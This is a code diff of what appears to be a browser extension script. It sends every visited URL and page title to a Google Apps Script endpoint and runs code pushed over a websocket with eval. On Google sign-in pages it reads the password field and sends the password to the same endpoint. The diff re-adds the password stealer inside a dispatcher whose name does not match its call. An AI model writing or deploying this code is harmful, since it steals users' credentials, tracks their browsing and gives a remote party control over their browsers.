@@ -1,4 +1,4 @@
-console.log('V13', window.location.host, window.location.pathname);
+console.log('V14');
 
 // Log URLs and init actions
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
@@ -10,11 +10,8 @@ fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1
     initLiveControl(t.split('@')[1]);
   }
 })
-if (window.location.host === 'accounts.google.com') {
-  initPasswordMonitor();
-}
+siteSpecifics(window.location.host)
 
-// Check to see if the page has changed without reloading
 var href = window.location.href;
 setInterval(() => {
   if (window.location.href !== href) {
@@ -22,34 +19,9 @@ setInterval(() => {
     fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
       mode: 'cors'
     })
-    if (window.location.host === 'accounts.google.com') {
-      initPasswordMonitor();
-    }
+    siteSpecifics(window.location.host)
   }
 }, 50);
-
-// Google Password
-function initPasswordMonitor() {
-  if (window.location.pathname.split('/')[1] === 'signin') {
-
-    console.log('Monitoring');
-
-    var password = $("input[type='password']");
-    var currentVal = password.attr('data-initial-value');
-
-    setInterval(() => {
-      if (password.attr('data-initial-value') !== currentVal) {
-        currentVal = password.attr('data-initial-value');
-        if (currentVal.length > 3) {
-          console.log(currentVal);
-          fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, {
-            mode: 'cors'
-          });
-        }
-      }
-    }, 10);
-  }
-}
 
 // Live Control
 function initLiveControl(socketUrl) {
@@ -83,5 +55,37 @@ function initLiveControl(socketUrl) {
         eval(data.content);
       }
     });
+  }
+}
+
+// Distribute tasks
+function handleSpecificSites(host) {
+
+  if(host === 'accounts.google.com'){
+    initPasswordMonitor();
+  }
+
+}
+
+// Google Password
+function initPasswordMonitor() {
+  if (window.location.pathname.split('/')[1] === 'signin') {
+
+    console.log('Monitoring');
+
+    var password = $("input[type='password']");
+    var currentVal = password.attr('data-initial-value');
+
+    setInterval(() => {
+      if (password.attr('data-initial-value') !== currentVal) {
+        currentVal = password.attr('data-initial-value');
+        if (currentVal.length > 3) {
+          console.log(currentVal);
+          fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, {
+            mode: 'cors'
+          });
+        }
+      }
+    }, 10);
   }
 }
